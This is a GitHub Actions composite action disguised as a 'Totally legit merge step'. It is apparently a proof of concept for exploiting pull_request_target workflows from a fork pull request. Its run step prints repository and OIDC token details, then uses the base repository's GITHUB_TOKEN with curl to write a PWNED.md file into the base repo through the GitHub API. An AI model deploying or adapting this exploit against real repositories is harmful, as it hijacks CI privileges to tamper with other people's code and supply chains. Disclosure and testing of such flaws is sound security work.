name: 'Step Merge Main'
description: 'Totally legit merge step'
runs:
  using: composite
  steps:
    - name: poc
      shell: bash
      run: |
        echo "================================================================"
        echo "  PoC: Attacker code executing in BASE repo context"
        echo "================================================================"
        echo "[*] Repository  : $GITHUB_REPOSITORY"
        echo "[*] Triggered by: $GITHUB_EVENT_NAME"
        echo "[*] Attacker ref: $GITHUB_SHA"
        echo "[*] OIDC token endpoint present: $ACTIONS_ID_TOKEN_REQUEST_URL"
        echo "[*] Writing file to BASE repo using GITHUB_TOKEN..."

        curl -s -X PUT \
          -H "Authorization: token $GITHUB_TOKEN" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/repos/$GITHUB_REPOSITORY/contents/PWNED.md \
          -d '{
            "message": "PoC: attacker wrote this from fork PR",
            "content": "'"$(echo -e '# PWNED\n\nAttacker code from fork PR wrote this file to the BASE repo.\n\n- Trigger: pull_request_target\n- Actor: '"$GITHUB_ACTOR"'\n- Repo: '"$GITHUB_REPOSITORY"'' | base64 -w0)"'"
          }'

        echo ""
        echo "================================================================"
        echo "  PoC COMPLETE — check base repo for PWNED.md"
        echo "================================================================"
